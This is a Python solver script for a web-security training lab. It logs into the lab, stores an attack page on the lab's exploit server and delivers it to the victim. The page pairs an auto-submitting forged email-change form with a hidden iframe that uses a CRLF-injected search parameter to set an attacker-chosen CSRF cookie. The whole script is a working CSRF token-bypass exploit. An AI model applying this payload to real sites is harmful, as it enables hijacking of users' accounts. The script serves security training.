import typer
from lxml import html
from requests import Session

from rich.console import Console

console = Console()
session = Session()

SERVER = "https://0ac5007904eb50e0c0c81400006f0094.web-security-academy.net"
response = session.get(f"{SERVER}/login")
html_document = html.fromstring(response.content)
csrf_token = html_document.xpath("//section/form/input[@name='csrf']/@value")[0]
# console.log(csrf_token)
response = session.post(f"{SERVER}/login", data={
    "csrf": csrf_token,
    "username": "wiener",
    "password": "peter"
})
# console.log(response.text)

html_document = html.fromstring(response.content)
exploit_server_link = html_document.xpath("//a[@id='exploit-link']/@href")[0]

response = session.get(f"{exploit_server_link}")
injected_html = f"<form id=\"email-form\" action=\"{SERVER}/my-account/change-email\" method=\"POST\">" \
      "<label>Email</label>" \
          "<input required="" type=\"email\" name=\"email\" value=\"prova@example.com\">" \
          "<input required="f" type=\"hidden\" name=\"csrf\" value=\"ciaoatutti\">" \
       "</form>" \
       f"<iframe style=\"display:none\" src=\"{SERVER}/?search=foo%0ASet%2DCookie%3A%20csrf%3Dciaoatutti%3B%20SameSite%3DNone\" onload=\"document.getElementById('email-form').submit();\"></iframe>"

response = session.post(f"{exploit_server_link}", data={
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK\n"
                    "Content-Type: text/html; charset=utf-8",
    "responseBody": injected_html,
    "formAction": "STORE"
})

response = session.post(f"{exploit_server_link}", data={
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": "HTTP/1.1 200 OK\n"
                    "Content-Type: text/html; charset=utf-8",
    "responseBody": injected_html,
    "formAction": "DELIVER_TO_VICTIM"
})

response = session.get(f"{SERVER}")
html_document = html.fromstring(response.content)
solved_link = html_document.xpath("//section[@id='notification-labsolved']")
if solved_link:
    console.log('You win')

